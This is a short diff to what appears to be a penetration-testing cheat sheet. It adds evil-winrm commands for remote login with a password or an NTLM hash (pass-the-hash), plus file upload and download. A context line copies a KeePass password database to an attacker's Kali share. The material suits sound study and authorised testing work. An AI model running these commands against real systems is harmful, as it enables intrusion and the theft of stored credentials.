@@ -145,3 +145,9 @@ copy Passwords.kdbx(windows filename) \\kali ip\sharename\Passwords.kdbx
 wget url
 curl url -o saved_file_path
 ```
+### Evil-Winrm
+evil-winrm -i ip -u username -p password
+evil-winrm -i ip -u username -H ntlm_hash
+evil-winrm basic commands:
+Upload usage: upload local_filename or upload local_filename destination_filename
+Download usage: download remote_filename or download remote_filename destination_filename
